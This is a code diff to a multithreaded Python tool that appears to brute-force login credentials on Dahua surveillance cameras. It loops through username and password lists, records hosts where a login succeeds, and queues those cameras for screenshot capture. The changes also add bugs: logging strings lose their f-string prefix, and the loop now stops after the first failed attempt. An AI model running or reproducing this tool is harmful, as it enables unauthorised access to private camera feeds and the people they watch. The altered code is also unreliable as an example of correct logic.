@@ -1,7 +1,7 @@
-import threading
 import logging
-import config
+import threading
 
+import config
 from dahua import DahuaController
 
 
@@ -18,56 +18,33 @@ class BruteThread(threading.Thread):
             self.dahua_auth(host)
             self.brute_queue.task_done()
 
-
     def dahua_login(self, server_ip, port, login, password):
         with threading.Lock():
             config.update_status()
-#            logging.info(f'[{config.state}%] Total bruted {len(config.working_hosts)} devices')
-            logging.debug('Login attempt: %s with %s:%s' % (server_ip, login, password))
+            logging.debug('Login attempt: {server_ip} with {login}:{password}')
         dahua = DahuaController(server_ip, port, login, password)
         if dahua.status == 0:
             logging.debug(f'Success login: {server_ip} with {login}:{password}')
             return dahua
         elif dahua.status == 2:
-            logging.debug('Blocked camera: %s:%s' % (server_ip, port))
+            logging.debug('Blocked camera: {server_ip}:{port}')
             return "Blocked"
         else:
-            logging.debug('Unable to login: %s:%s with %s:%s' % (server_ip, port, login, password))
+            logging.debug('Unable to login: {server_ip}:{port} with {login}:{password}')
             return None
-
 
     def dahua_auth(self, host):
         server_ip = host[0]
         port = int(host[1])
-        if config.logopasses:
-#            anti_block = 0
-            for logopass in config.logopasses:
-                password = logopass[1]
-                login = logopass[0]
+        for login in config.logins:
+            for password in config.passwords:
                 try:
                     res = self.dahua_login(server_ip, port, login, password)
-#                    anti_block += 1
-                    if res == "Blocked": #and anti_block > 4:
+                    if res == "Blocked" or res is None:
                         break
-                    elif res:
-                        config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
-                        config.ch_count += res.channels_count
-                        self.screenshot_queue.put(res)
-                        return
+                    config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
+                    config.ch_count += res.channels_count
+                    self.screenshot_queue.put(res)
+                    return
                 except Exception as e:
-                    logging.debug('Connection error: %s:%s - %s' % (server_ip, port, str(e)))
-        else:
-            for login in config.logins:
-                for password in config.passwords:
-                    try:
-                        res = self.dahua_login(server_ip, port, login, password)
-                        if res == "Blocked":
-                            break
-                        elif res:
-                            config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
-                            config.ch_count += res.channels_count
-                            self.screenshot_queue.put(res)
-                            return
-                    except Exception as e:
-                        logging.debug('Connection error: %s:%s - %s' % (server_ip, port, str(e)))
-        return
+                    logging.debug(f'Connection error: {server_ip}:{port} - {str(e)}')
